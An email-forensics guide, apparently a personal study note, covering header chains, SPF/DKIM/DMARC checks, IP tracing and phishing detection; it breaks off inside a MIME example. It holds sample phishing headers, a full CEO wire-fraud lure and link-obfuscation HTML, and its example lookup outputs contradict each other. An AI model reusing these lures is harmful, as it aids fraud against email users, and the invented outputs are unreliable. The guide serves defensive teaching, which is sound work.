---
title: "📧 Email Forensics — Complete Investigation Guide"
tags:
  - email-forensics
  - cybersecurity
  - dfir
  - phishing
  - spf-dkim-dmarc
  - threat-analysis
  - incident-response
  - blue-team
created: 2025-05-21
modified: 2025-05-21
status: complete
type: master-note
aliases:
  - Email Forensics
  - Email Investigation
  - Email Analysis
---

# 📧 Email Forensics — Complete Investigation Guide

> [!abstract] What is Email Forensics?
> Email forensics is the **systematic process** of collecting, analyzing, and preserving email evidence to investigate cybercrimes, fraud, phishing, harassment, or unauthorized access. It involves tracing email origins, verifying authenticity, detecting spoofing, analyzing malicious content, and building evidence timelines for legal proceedings.

---

## 🗺️ Table of Contents

| # | Section | Description |
|---|---------|-------------|
| 1 | [[#📋 Investigation Workflow]] | Step-by-step process overview |
| 2 | [[#📨 Email Headers — Deep Dive]] | Reading & interpreting raw headers |
| 3 | [[#🔐 SPF — Sender Policy Framework]] | IP authorization records |
| 4 | [[#✍️ DKIM — DomainKeys Identified Mail]] | Cryptographic signatures |
| 5 | [[#🛡️ DMARC — Domain-based Message Authentication]] | Policy enforcement |
| 6 | [[#🌐 IP Address Tracing]] | Geolocation & threat intelligence |
| 7 | [[#🎣 Phishing Analysis]] | Detection techniques & examples |
| 8 | [[#📎 Attachment Analysis]] | Malware detection & MIME decoding |
| 9 | [[#🛠️ Tools Arsenal]] | Complete tool reference |
| 10 | [[#⏱️ Building Investigation Timeline]] | Evidence & documentation |
| 11 | [[#✅ Investigation Checklist SOP]] | Standard operating procedure |
| 12 | [[#🚩 Red Flag Quick Reference]] | Indicators of compromise |

---

## ⚠️ Legal & Ethical Notice

> [!warning] Authorization Required
> Always obtain **proper written authorization** before analyzing emails.
> 
> - 🇺🇸 **USA** — Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act
> - 🇬🇧 **UK** — Computer Misuse Act (CMA), RIPA
> - 🇮🇳 **India** — Information Technology Act 2000, Section 66
> - 🇪🇺 **EU** — GDPR, ePrivacy Directive
> 
> Preserve **chain of custody** for any evidence used in legal proceedings. Document every action with timestamps.

---

## 📋 Investigation Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                  EMAIL FORENSICS WORKFLOW                       │
├──────────┬──────────┬──────────┬──────────┬──────────┬─────────┤
│  STEP 1  │  STEP 2  │  STEP 3  │  STEP 4  │  STEP 5  │ STEP 6  │
│ Acquire  │ Extract  │  Check   │  Trace   │ Analyze  │Document │
│  Email   │ Headers  │Auth(SPF/ │   IPs    │ Content/ │Evidence │
│          │          │DKIM/DMARC│          │Attachmnt │         │
└──────────┴──────────┴──────────┴──────────┴──────────┴─────────┘
```

### How to Export Raw Email

| Email Client | Steps to Get Raw Headers |
|---|---|
| **Gmail** | Open email → ⋮ (three dots) → "Show original" |
| **Outlook (Desktop)** | File → Properties → Internet headers section |
| **Outlook (Web)** | ⋮ → View → View message source |
| **Thunderbird** | View → Headers → All, or press `Ctrl+U` |
| **Apple Mail** | View → Message → All Headers, or `Cmd+Shift+H` |
| **Yahoo Mail** | ⋮ More → View Raw Message |
| **ProtonMail** | ⋮ → View headers |
| **Zoho Mail** | ⋮ → Show Original |

---

## 📨 Email Headers — Deep Dive

> [!info] What Are Headers?
> Email headers are **metadata fields** prepended to every email. They record the complete journey of an email from sender to recipient — every mail server that touched it, when, and authentication results. Most email clients hide headers by default.

### 🔍 Real Complete Header Example

```
Delivered-To: victim@victim-corp.com
Received: from mail.evil-sender.ru (mail.evil-sender.ru [185.220.101.45])
        by mx.victim-corp.com (Postfix) with ESMTPS id A4B3C2D1E0F
        for <victim@victim-corp.com>;
        Thu, 15 May 2025 09:14:22 -0700 (PDT)
Received: from webmail.evil-sender.ru (localhost [127.0.0.1])
        by mail.evil-sender.ru (Postfix) with ESMTPS id 7X8Y9Z1A2B
        for <victim@victim-corp.com>;
        Thu, 15 May 2025 21:13:55 +0300
Authentication-Results: mx.victim-corp.com;
       dkim=fail (signature did not verify) header.d=paypal.com;
       spf=fail (domain of noreply@paypal.com does not designate
           185.220.101.45 as permitted sender) smtp.mailfrom=noreply@paypal.com;
       dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=paypal.com
Received-SPF: fail (mx.victim-corp.com: domain of noreply@paypal.com does
       NOT designate 185.220.101.45 as permitted sender)
       client-ip=185.220.101.45; helo=mail.evil-sender.ru;
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=paypal.com; s=pp-dkim1;
        h=from:to:subject:date:message-id;
        bh=INVALID_HASH_VALUE_FORGED==;
        b=FORGED_SIGNATURE_BYTES_HERE==
X-Originating-IP: 185.220.101.45
X-Mailer: PHPMailer 6.5.1
Message-ID: <20250515091355.99999@evil-sender.ru>
Date: Thu, 15 May 2025 09:14:22 -0700
From: "PayPal Security Team" <noreply@paypal.com>
Reply-To: harvest-credentials@evil-server.ru
Return-Path: <bounce@evil-mailer.net>
To: victim@victim-corp.com
Subject: [URGENT] Your PayPal account has been limited
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_99999_1234567890"
```

---

### 🛤️ The Received Header Chain — Most Critical Field

> [!tip] Golden Rule: Read Bottom to Top
> The **BOTTOM-MOST** `Received:` header is where the email truly originated.
> Each hop ABOVE is a relay server. Attackers **can forge** headers above the first one your own server wrote — so **only trust the first Received header added by YOUR mail server**.

```
READING ORDER (bottom → top = chronological order):

[4] Received: by mx.victim-corp.com ← YOUR server wrote this (TRUST IT)
            from 185.220.101.45
            Thu, 15 May 2025 09:14:22 -0700

[3] Received: by mail.evil-sender.ru (first relay)
            from webmail.evil-sender.ru [127.0.0.1]
            Thu, 15 May 2025 21:14:01 +0300

[2] Received: from webmail (origin — sent by attacker's webmail)
            Thu, 15 May 2025 21:13:55 +0300
                                        ↑
              TIMEZONE MISMATCH: Date says -0700 (US Pacific)
              but server clocks say +0300 (Eastern Europe) — RED FLAG!
```

**Anatomy of a single Received header:**

```
Received: from [SENDER_HOSTNAME] ([ACTUAL_IP])
          by [RECEIVING_SERVER] (software) with [PROTOCOL] id [LOG_ID]
          for <RECIPIENT>;
          [TIMESTAMP_WITH_TIMEZONE]
          
          ↑ "from" name = what server claims to be (can be faked)
                   ↑ IP in () = REAL IP address (use this for tracing)
```

**Transit time analysis:**

```
Hop 1→2: 6 seconds   ← Normal (internal processing)
Hop 2→3: 21 seconds  ← Normal (internet transit)
Hop 3→4: 2 hours     ← SUSPICIOUS — delayed, possible greylisting or queue
```

---

### 📋 All Header Fields Reference

| Header Field | Purpose | Spoofable? | What to Investigate |
|---|---|---|---|
| `Received` | Mail server relay chain | Bottom hop only trustworthy | Real IPs, transit times |
| `From` | Displayed sender name/address | ✅ Fully spoofable | Display name vs domain mismatch |
| `Return-Path` | Where bounces go | ⚠️ Partially | Should match From domain |
| `Reply-To` | Where replies are directed | ✅ Fully spoofable | If differs from From = hijacked replies |
| `Sender` | Actual sending account | ⚠️ Partially | Differs from From in delegated sending |
| `Message-ID` | Unique email identifier | ⚠️ Partially | Domain should match sender's domain |
| `X-Originating-IP` | Device's public IP (added by webmail) | ✅ By sender | Use for geolocation of device |
| `X-Mailer` | Email client used | ✅ Fully | Reveals sending software/framework |
| `X-Spam-Status` | Spam score from recipient's filter | ❌ No | Shows spam score and which rules fired |
| `Authentication-Results` | SPF/DKIM/DMARC results | ❌ No (added by your server) | Most important auth field |
| `DKIM-Signature` | Cryptographic signature | ❌ Validity checked | Check d= matches From domain |
| `Received-SPF` | SPF check result | ❌ No | pass/fail/softfail/neutral |
| `MIME-Version` | Email format version | ⚠️ Partially | Mismatches suggest unusual clients |
| `Content-Type` | Body encoding and boundaries | ⚠️ Partially | multipart/mixed = attachments present |
| `Date` | Claimed send timestamp | ✅ Fully spoofable | Compare timezone to Received headers |

---

### 🕵️ Suspicious Header Patterns

**Pattern 1: Message-ID Domain Mismatch**

```
From:       noreply@amazon.com
Message-ID: <20250515091355.99999@evil-sender.ru>
                                   ↑
            NOT amazon.com — reveals the real sending server
```

**Pattern 2: Reply-To Harvesting**

```
From:     "PayPal" <noreply@paypal.com>
Reply-To: harvester@criminal-server.ru
          ↑
          All victim replies go here — attacker reads them
```

**Pattern 3: Date/Timezone Inconsistency**

```
Date:      Thu, 15 May 2025 09:14:22 -0700   ← Claims US Pacific timezone
Received:  ... Thu, 15 May 2025 21:13:55 +0300 ← Server is Eastern Europe

CONCLUSION: Sender faked the Date header to appear local
```

**Pattern 4: Forged Display Name**

```
From: "Apple Support <noreply@apple.com>" <attacker@random-server.xyz>
                                            ↑
      Some clients render the quoted string as the "From" address
      The ACTUAL sending address is attacker@random-server.xyz
```

---

## 🔐 SPF — Sender Policy Framework

> [!info] What is SPF?
> SPF is a **DNS TXT record** that lists which IP addresses are authorized to send email for a domain. When an email arrives claiming to be from `user@example.com`, the receiving mail server checks the DNS record for `example.com` to verify the sending IP is listed there.

### How SPF Works (Step by Step)

```
1. Email arrives claiming to be FROM: boss@company.com
2. Receiving server extracts the sending IP: 185.220.101.45
3. Server queries DNS: dig TXT company.com
4. Compares sending IP against authorized IPs in SPF record
5. Result: PASS (authorized) or FAIL (not authorized)
```

### SPF DNS Record Structure

```dns
; Full SPF record example:
company.com.  IN  TXT  "v=spf1 ip4:192.0.2.0/24 ip4:203.0.113.5 include:_spf.google.com include:sendgrid.net mx -all"

; Breaking it down:
; v=spf1               → SPF version 1 (always starts with this)
; ip4:192.0.2.0/24     → Entire /24 subnet is authorized to send
; ip4:203.0.113.5      → This single specific IP is authorized
; include:_spf.google.com → Also authorize ALL of Google's mail IPs
; include:sendgrid.net    → Also authorize SendGrid (email service)
; mx                   → Authorize the domain's own MX servers
; -all                 → HARD FAIL: anything else MUST be rejected

; Other qualifiers:
; ~all  → Soft fail: suspicious but accept (tag as spam)
; ?all  → Neutral: no policy (dangerous — allows everything)
; +all  → Allow all (NEVER use — defeats entire purpose of SPF)
```

> [!danger] SPF Trap: `~all` vs `-all`
> Most domains mistakenly use `~all` (SoftFail) instead of `-all` (HardFail).
> With `~all`, phishing emails only get marked as spam — NOT rejected!
> For real protection, use `-all`.

### Querying SPF Records

```bash
# Basic SPF lookup
dig TXT amazon.com

# Output:
amazon.com. 300 IN TXT "v=spf1 include:spf1.amazon.com include:spf2.amazon.com
                         include:amazonses.com -all"

# Follow the includes:
dig TXT spf1.amazon.com
# amazon.com. IN TXT "v=spf1 ip4:207.171.160.0/19 ip4:207.171.184.0/21 ..."

# Check if a specific IP passes:
python3 -c "
import spf
result, code, msg = spf.check2(i='185.220.101.45', s='noreply@amazon.com', h='mail.evil-server.ru')
print(f'Result: {result}')  # fail
print(f'Message: {msg}')
"
```

### SPF Results in Email Headers

```
# ─── LEGITIMATE EMAIL ───
Received-SPF: pass (google.com: domain of support@amazon.com designates
              207.171.168.25 as permitted sender)
              client-ip=207.171.168.25;
              envelope-from=support@amazon.com;
              helo=smtp-out-1.amazon.com;

# ─── PHISHING EMAIL ───
Received-SPF: fail (google.com: domain of noreply@paypal.com does NOT
              designate 185.220.101.45 as permitted sender)
              client-ip=185.220.101.45;
              envelope-from=noreply@paypal.com;
              helo=mail.evil-server.ru;
              mechanism=-all

# ─── WEAK PROTECTION ───
Received-SPF: softfail (google.com: domain of info@bank.com is best guess
              as NOT permitted)
              client-ip=91.108.4.45;
              receiver=google.com;
```

### SPF Result Codes

| Result | Meaning | Action |
|---|---|---|
| `pass` | IP is authorized | Accept normally |
| `fail` (-all) | IP NOT authorized, hard fail | Reject message |
| `softfail` (~all) | IP not authorized, soft fail | Mark as spam or tag |
| `neutral` (?all) | No policy statement | Accept (treat as no SPF) |
| `none` | No SPF record found | Accept (no policy) |
| `temperror` | DNS lookup temporary failure | Try again later |
| `permerror` | SPF record syntax error | Treat as fail |

---

## ✍️ DKIM — DomainKeys Identified Mail

> [!info] What is DKIM?
> DKIM adds a **cryptographic digital signature** to emails. The sending domain generates a signature using their private key and includes it in the email header. Receivers look up the public key in DNS and verify the signature — proving the email content was **not modified in transit** and was sent by someone with access to the private key.

### How DKIM Works (Step by Step)

```
SENDER SIDE:
1. Mail server selects specific headers + body to sign
2. Creates hash of selected content
3. Encrypts hash with PRIVATE key → this is the signature
4. Adds DKIM-Signature header with selector and signature

RECEIVER SIDE:
1. Reads d= (domain) and s= (selector) from DKIM-Signature
2. Looks up: [selector]._domainkey.[domain] in DNS
3. Retrieves PUBLIC key from DNS TXT record
4. Decrypts signature using public key → gets expected hash
5. Recalculates hash of email content
6. Compares: if hashes match → PASS, if not → FAIL
```

### DKIM Signature Header Anatomy

```
DKIM-Signature: v=1;              ← DKIM version 1
                a=rsa-sha256;     ← Algorithm: RSA with SHA-256
                c=relaxed/relaxed; ← Canonicalization: body and header
                d=amazon.com;     ← Signing DOMAIN (check vs From: domain!)
                s=20210112;       ← SELECTOR — identifies which key to use
                t=1747310400;     ← Timestamp of signing (Unix epoch)
                x=1747396800;     ← Expiration timestamp
                h=from:to:subject:date:message-id:mime-version:content-type;
                ↑ Which headers are COVERED by the signature
                bh=Yc1QVqPdZWwDvhWqaEnmJsLKxRO2+3fgP1N8yT7vUk=;
                ↑  Hash of the email BODY
                b=ABCDefGHIJklMNOpqRSTuvWXYZ0123456789abcde
                  fghijklmnopqrstuvwxyz0123456789ABCDEFGHIJ==
                ↑ The actual SIGNATURE (encrypted hash of headers)
```

### Looking Up DKIM Public Key

```bash
# Format: [selector]._domainkey.[domain]
# From header: d=amazon.com; s=20210112

dig TXT 20210112._domainkey.amazon.com

# Output:
20210112._domainkey.amazon.com. 300 IN TXT
    "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC..."
    
# v=DKIM1   → DKIM key record version
# k=rsa     → Key type: RSA
# p=...     → The PUBLIC KEY (base64 encoded)
```

### DKIM Results in Authentication Header

```
# ─── VALID SIGNATURE ───
Authentication-Results: mx.google.com;
    dkim=pass header.i=@amazon.com header.s=20210112 header.b=ABCDefGH;
    
# ─── FORGED/MODIFIED EMAIL ───
Authentication-Results: mx.google.com;
    dkim=fail (signature did not verify) header.i=@amazon.com;
    
# Reasons for DKIM fail:
# 1. Email body was modified after signing (forwarding with footer)
# 2. Attacker forged headers that are in the h= list
# 3. Domain uses wrong/revoked key
# 4. d= domain doesn't match From: domain (alignment failure)

# ─── NO SIGNATURE ───
Authentication-Results: mx.google.com;
    dkim=none;
# Sender doesn't use DKIM at all — suspicious for major services
```

> [!warning] DKIM Replay Attack
> A valid DKIM signature does NOT prove the email was sent to YOU.
> An attacker can:
> 1. Receive a legitimately signed email (e.g. newsletter)
> 2. Change the `To:` field  
> 3. Forward to victims — DKIM still passes!
> This is why DMARC alignment is also needed.

### DKIM Selector Discovery

```bash
# Common selector names to try if you need to find the key:
# google   mail   default   k1   k2   s1   s2   dkim   email

# Try each:
dig TXT google._domainkey.example.com
dig TXT mail._domainkey.example.com
dig TXT default._domainkey.example.com

# Or use dmarcian/mxtoolbox to enumerate selectors
# https://mxtoolbox.com/dkim.aspx
```

---

## 🛡️ DMARC — Domain-based Message Authentication

> [!info] What is DMARC?
> DMARC ties SPF and DKIM together. It does two things:
> 1. **Alignment**: Checks that the `From:` domain matches the SPF/DKIM signing domain
> 2. **Policy**: Tells receivers what to do when checks fail (none / quarantine / reject)
> 3. **Reporting**: Sends aggregate and forensic reports back to domain owners

### DMARC DNS Record Structure

```dns
# Query: dig TXT _dmarc.example.com

_dmarc.example.com. IN TXT
    "v=DMARC1;
     p=reject;           ← POLICY: none | quarantine | reject
     pct=100;            ← Apply to 100% of messages (can lower for testing)
     sp=reject;          ← Policy for subdomains
     rua=mailto:dmarc-agg@example.com;   ← Aggregate reports (daily)
     ruf=mailto:dmarc-forensic@example.com; ← Forensic (per-failure) reports
     fo=1;               ← Send forensic report if SPF OR DKIM fails
     aspf=s;             ← SPF alignment: s=strict, r=relaxed
     adkim=s;            ← DKIM alignment: s=strict, r=relaxed
     ri=86400"           ← Report interval: 86400 seconds = 24 hours
```

### DMARC Policy Comparison

| Policy | Effect | Protection Level |
|---|---|---|
| `p=none` | Monitor only, take no action | ❌ No protection (logging only) |
| `p=quarantine` | Deliver to spam/junk folder | ⚠️ Partial protection |
| `p=reject` | Refuse delivery entirely | ✅ Full protection |

### DMARC Alignment Explained

```
STRICT Alignment (aspf=s, adkim=s):
  From: boss@company.com
  SPF envelope must match: exactly @company.com ← PASS
  SPF from:              ← @subdomain.company.com → FAIL (different subdomain)
  
RELAXED Alignment (aspf=r, adkim=r) — DEFAULT:
  From: boss@company.com
  SPF envelope from @company.com       → PASS
  SPF envelope from @mail.company.com  → PASS (same eTLD+1)
  SPF envelope from @evil.com          → FAIL
```

### Full DMARC Results Example

```
# ─── LEGITIMATE EMAIL from Amazon ───
Authentication-Results: mx.google.com;
    spf=pass (google.com: domain of amazon.com designates 207.171.168.25
              as permitted sender) smtp.mailfrom=amazon.com;
    dkim=pass header.i=@amazon.com header.s=20210112 header.b=RNVkwFjH;
    dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=amazon.com

# ANALYSIS: All three pass. Email is legitimate. ✅

# ─── PHISHING EMAIL impersonating Amazon ───
Authentication-Results: mx.google.com;
    spf=fail (google.com: domain of amazon.com does NOT designate
              185.220.101.45 as permitted sender);
    dkim=fail (signature did not verify) header.i=@amazon.com;
    dmarc=fail (p=REJECT sp=REJECT dis=REJECT) header.from=amazon.com

# ANALYSIS:
# - SPF fails: sending IP not in Amazon's authorized list
# - DKIM fails: signature forged or body modified  
# - DMARC fails: both SPF and DKIM failed
# - p=REJECT: should have been rejected by receiving server
# - If you received this email: server ignored DMARC policy! ❌

# ─── WEAK DMARC — Common Mistake ───
Authentication-Results: mx.google.com;
    spf=fail;
    dkim=fail;
    dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=bigcorp.com

# ANALYSIS:
# p=NONE means bigcorp.com has DMARC but no enforcement!
# Phishing still gets delivered. Attacker chose this target
# because they checked DMARC first. ⚠️
```

### Checking DMARC for Any Domain

```bash
# Quick DMARC check
dig TXT _dmarc.target-domain.com

# Python script to check all three at once:
python3 << 'EOF'
import dns.resolver

domain = "paypal.com"

# SPF
try:
    spf = dns.resolver.resolve(domain, 'TXT')
    for r in spf:
        if 'v=spf1' in str(r):
            print(f"SPF: {r}")
except: print("SPF: NOT FOUND")

# DMARC  
try:
    dmarc = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
    for r in dmarc:
        print(f"DMARC: {r}")
except: print("DMARC: NOT FOUND")
EOF
```

---

## 🌐 IP Address Tracing

> [!tip] Key Principle
> The goal is to extract the **true origin IP** from the Received header chain, then trace it to its physical location, ISP, and reputation databases.

### Step 1 — Extract Public IP from Headers

```
Full Received chain from suspicious email:

Received: from [185.220.101.45] (helo=mail.totally-legit.com)
        by mx1.victim.org (Postfix) with ESMTPS id A1B2C3D4
        for <hr@victim.org>; Mon, 20 May 2025 14:22:11 -0400
        
Received: from [10.0.0.5] (localhost [127.0.0.1])
        by mail.totally-legit.com with ESMTP
        for <hr@victim.org>; Mon, 20 May 2025 21:22:05 +0300
        
Received: from [192.168.1.100] by webmail.totally-legit.com
        Mon, 20 May 2025 21:22:01 +0300

─── IP Classification ───
10.0.0.5      → Private RFC1918 — IGNORE (internal network)
192.168.1.100 → Private RFC1918 — IGNORE (internal network)
127.0.0.1     → Loopback — IGNORE (localhost)
185.220.101.45 → PUBLIC IP ← THIS is what we investigate!
```

**Private IP Ranges to Ignore:**

```
10.0.0.0/8          → 10.x.x.x
172.16.0.0/12       → 172.16.x.x to 172.31.x.x
192.168.0.0/16      → 192.168.x.x
127.0.0.0/8         → 127.x.x.x (loopback)
169.254.0.0/16      → Link-local
::1                 → IPv6 loopback
fc00::/7            → IPv6 unique local
```

### Step 2 — WHOIS Lookup

```bash
# Command line WHOIS
whois 185.220.101.45

# ─── Output ───
NetRange:       185.220.96.0 - 185.220.127.255
CIDR:           185.220.96.0/19
NetName:        ACCESSNOW-TOR
OrgName:        Tor Project, Inc.
OrgId:          TORPR
Address:        217 First St
City:           Cambridge
StateProv:      MA
Country:        US
RegDate:        2018-10-03
Updated:        2023-05-17

Tech Email: bad-hosts@torproject.org
Ref: https://rdap.arin.net/registry/ip/185.220.101.45

# CONCLUSION: This is a Tor Exit Node!
# Real attacker's IP is anonymized — cannot determine without legal process

# ─── Alternative: VPS/Hosting provider ───
OrgName:        DigitalOcean, LLC
OrgId:          DO-13
Address:        101 Avenue of the Americas, 10th Floor
City:           New York
StateProv:      NY
PostalCode:     10013
Country:        US
# CONCLUSION: Email sent from rented VPS — subpoena DigitalOcean for logs
```

### Step 3 — Reverse DNS Lookup

```bash
# Reverse DNS tells you the hostname assigned to an IP
host 185.220.101.45
# Output: 45.101.220.185.in-addr.arpa domain name pointer tor-exit-se.privacy.com

nslookup 91.108.4.1
# Output: 1.4.108.91.in-addr.arpa → dc1-mow.telegram.com
# (This would be a Telegram server)

# In Python:
import socket
hostname = socket.gethostbyaddr("185.220.101.45")
print(hostname)
# ('tor-exit.privacy.com', [], ['185.220.101.45'])
```

### Step 4 — Geolocation Lookup

```bash
# Using curl to ipinfo.io (free API):
curl ipinfo.io/185.220.101.45

# ─── Output ───
{
  "ip": "185.220.101.45",
  "hostname": "tor-exit.example.org",
  "city": "Nuremberg",
  "region": "Bavaria",
  "country": "DE",
  "loc": "49.4478,11.0683",
  "org": "AS200019 FlokiNET ehf",
  "postal": "90403",
  "timezone": "Europe/Berlin"
}

# Using MaxMind GeoIP2 (Python — more accurate, offline capable):
pip install geoip2
# Download GeoLite2-City.mmdb from MaxMind

import geoip2.database
with geoip2.database.Reader('GeoLite2-City.mmdb') as reader:
    response = reader.city('91.108.4.1')
    print(f"Country:   {response.country.name}")
    print(f"City:      {response.city.name}")
    print(f"Latitude:  {response.location.latitude}")
    print(f"Longitude: {response.location.longitude}")
    print(f"ISP:       {response.traits.isp}")

# ─── Output ───
Country:   Russia
City:      Moscow
Latitude:  55.7386
Longitude: 37.6068
ISP:       Telegram Messenger Inc.
ASN:       AS62041
```

### Step 5 — Threat Intelligence Lookups

```bash
# ── VirusTotal IP Lookup ──
curl -s "https://www.virustotal.com/api/v3/ip_addresses/185.220.101.45" \
  -H "x-apikey: YOUR_API_KEY" | python3 -m json.tool

# ─── Relevant output fields ───
{
  "data": {
    "attributes": {
      "last_analysis_stats": {
        "malicious": 47,     ← 47 vendors flagged as malicious!
        "suspicious": 3,
        "harmless": 0,
        "undetected": 15
      },
      "country": "NL",
      "as_owner": "Tor Project",
      "asn": 62041,
      "last_analysis_date": 1747123200,
      "reputation": -87       ← Negative = bad reputation
    }
  }
}

# ── AbuseIPDB Lookup ──
curl "https://api.abuseipdb.com/api/v2/check?ipAddress=185.220.101.45&maxAgeInDays=90" \
  -H "Key: YOUR_API_KEY" \
  -H "Accept: application/json"

# ─── Output ───
{
  "data": {
    "ipAddress": "185.220.101.45",
    "isPublic": true,
    "ipVersion": 4,
    "isWhitelisted": false,
    "abuseConfidenceScore": 100,  ← 100% = definitely malicious
    "countryCode": "NL",
    "usageType": "Tor Exit Node",
    "isp": "FlokiNET",
    "domain": "flokinet.is",
    "totalReports": 3892,
    "numDistinctUsers": 187,
    "lastReportedAt": "2025-05-14T08:23:11+00:00",
    "reports": [...]
  }
}
```

### IP Classification Table

| IP Type | Example | Meaning | Action |
|---|---|---|---|
| Private RFC1918 | 10.x, 192.168.x, 172.16-31.x | Internal network | Ignore for tracing |
| Loopback | 127.0.0.1, ::1 | Server itself | Ignore |
| Tor Exit Node | 185.220.x.x range | Deliberately anonymized | Legal process to de-anonymize |
| VPN Provider | Various (Mullvad, NordVPN, etc.) | User using VPN | Subpoena VPN provider |
| Hosting/VPS | DigitalOcean, Linode, OVH | Rented server | Subpoena hosting provider |
| Residential ISP | Comcast, Jio, BT | End user device | Subpoena ISP for subscriber info |
| CDN/Reverse Proxy | Cloudflare, Fastly | Behind proxy | Request origin IP from CDN |
| Known Blacklisted | Spamhaus CBL/SBL listed | Known spam source | High confidence malicious |

---

## 🎣 Phishing Analysis

> [!danger] Most Common Attack Vector
> Phishing emails account for **over 90% of all data breaches** (Verizon DBIR). Learning to identify them is the highest-value forensic skill.

### Domain Spoofing Techniques

#### 1. Homograph / Lookalike Domain Attack

```
# Visual comparison — spot the difference:
paypal.com          ← LEGITIMATE
paypa1.com          ← Number 1 replacing letter l
paypa⁠l.com          ← Zero-width character inserted (invisible!)
pаypal.com          ← Cyrillic 'а' (U+0430) looks identical to Latin 'a'
paypal-secure.com   ← Legitimate-looking subdomain prepended
secure-paypal.com   ← Brand name moved after hyphen
paypal.com.phish.ru ← paypal.com is a subdomain of phish.ru!
paypał.com          ← IDN: Polish ł character

# Detect IDN homograph attacks:
python3 -c "
domain = 'pаypal.com'
try:
    punycode = domain.encode('idna').decode('ascii')
    print(f'Punycode: {punycode}')
    # Output: xn--pypal-4ve.com  ← Reveals Cyrillic character!
except Exception as e:
    print(f'Error: {e}')
"

# Always check domain age when suspicious:
whois paypal-secure.com | grep -i "creation date"
# Creation Date: 2025-05-12T10:23:44Z  ← 3 days before attack!
```

#### 2. Subdomain Confusion Attack

```
# Attacker registers the domain, makes a subdomain look like target
URL:  https://paypal.com.account-verify.xyz/login
               ↑           ↑
       This looks like    ACTUAL domain is account-verify.xyz
       the domain!        paypal.com is just a subdomain!

# Browser address bar breakdown:
SCHEME://[SUBDOMAIN.SUBDOMAIN.]DOMAIN.TLD/PATH
= https:// paypal.com . account-verify.xyz / login
                         ↑ This is what the server actually is
```

#### 3. Display Name Spoofing

```
# Header as sent by attacker:
From: "Apple Support <noreply@apple.com>" <phisher@random-vps-12345.ru>

# What many email clients display:
  Apple Support <noreply@apple.com>
  ↑ Shows the QUOTED STRING as sender, hides real address!

# Another variant:
From: "security-alert@amazon.com" <no-reply@amaz0n-support.net>
       ↑ Displayed sender         ↑ Actual sending address

# How to check: Always expand/view full From: address in your client
```

#### 4. URL Obfuscation Techniques

```html
<!-- Technique 1: Mismatched link text -->
<a href="https://evil-phisher.ru/steal">
  https://paypal.com/login
</a>
<!-- Text says PayPal but href goes to evil site -->

<!-- Technique 2: URL shorteners -->
<a href="https://bit.ly/3xK9mP2">Click here to verify</a>
<!-- Expander: curl -IL bit.ly/3xK9mP2 | grep Location -->

<!-- Technique 3: Open redirects -->
https://accounts.google.com/ServiceLogin?continue=https://evil.ru/phish
         ↑ Legitimate Google domain                   ↑ Goes here after

<!-- Technique 4: Data URIs -->
<a href="data:text/html;base64,AABBCC...">
<!-- Runs malicious HTML directly from base64 in the URL! -->

<!-- Technique 5: Unicode in URL -->
https://www.xn--pple-43d.com  (= аpple.com with Cyrillic а)
```

**Defanging URLs for Safe Documentation:**

```python
# Always defang URLs before including in reports (prevents accidental clicks)
def defang(url):
    return url.replace('http', 'hxxp').replace('.', '[.]').replace('@', '[@]')

url = "https://paypal.com.evil-phisher.ru/steal?token=abc123"
print(defang(url))
# hxxps://paypal[.]com[.]evil-phisher[.]ru/steal?token=abc123
```

---

### Business Email Compromise (BEC) — Real Example

```
# Email received by finance department:

From:     "John Smith - CEO" <jsmith@company-corp.co>
                                     ↑ Real domain: company.com
                                       This is: company-corp.co (different!)
To:       sarah.finance@company.com
Reply-To: ceo.john2025@protonmail.com
          ↑ Replies go to attacker's anonymous ProtonMail
Subject:  Confidential — Urgent Wire Transfer

Hi Sarah,

I'm currently in a board meeting with investors (cannot be
disturbed by phone). I need you to process an urgent wire 
transfer for a new vendor acquisition — strictly confidential,
do not discuss with anyone per our NDA.

Amount:   $47,500 USD
Bank:     First National Trust
Account:  8823441290  
Routing:  021000021
Memo:     Vendor Acquisition Q2-2025

Please complete within the next 2 hours. I'll brief the
full team on Monday. This is time-sensitive.

Best,
John Smith
CEO, Company Corp
+1 (555) 234-5678

─────────────────────────────────────
RED FLAGS ANALYSIS:
─────────────────────────────────────
[1] DOMAIN: company-corp.co ≠ company.com
[2] Reply-To: Anonymous ProtonMail (attacker's real inbox)
[3] URGENCY: "2 hours", "cannot be disturbed"  
[4] SECRECY: "do not discuss with anyone"
[5] PRESSURE: Invokes CEO authority + NDA
[6] NO PROCESS: No PO number, no approval chain, no vendor contract
[7] Header check: SPF=fail, DKIM=none, DMARC=fail
[8] Domain registered 5 days before this email
```

---

### Social Engineering Indicator Reference

| Technique | Example Phrases | Psychology Exploited |
|---|---|---|
| **Urgency** | "24 hours", "immediately", "last warning", "expires today" | Panic → bypasses rational thought |
| **Authority** | "IT Department", "CEO", "IRS", "Court Order" | Obedience → fear of consequences |
| **Fear** | "Account suspended", "Legal action", "Virus detected" | Threat response → act without thinking |
| **Reward** | "You've won", "Tax refund", "Package waiting" | Greed → curiosity override |
| **Scarcity** | "Only you were selected", "Limited offer", "Act now" | FOMO → impulsive action |
| **Trust** | "As per our last conversation", "Confirming your request" | Pre-established relationship |
| **Reciprocity** | "I did a favor for you, now I need..." | Social obligation |

---

## 📎 Attachment Analysis

> [!danger] Safety Rules — CRITICAL
> 1. **NEVER** open suspicious attachments on your main/work machine
> 2. Use an **isolated VM** (REMnux, Kali, Flare VM) with network disabled
> 3. Take a **snapshot** before analysis so you can revert
> 4. For dynamic analysis, use online sandboxes: any.run, Joe Sandbox, Triage
> 5. Always **hash files first** and search VirusTotal before executing

### Understanding MIME Structure

```
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----=_Part_99999_1234567890"

------=_Part_99999_1234567890
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

[HTML email body — the visible message]

------=_Part_99999_1234567890
Content-Type: application/octet-stream; name="Invoice_May2025.pdf"
Content-Disposition: attachment; filename="Invoice_May2025.pdf"
Content-Transfer-Encoding: base64

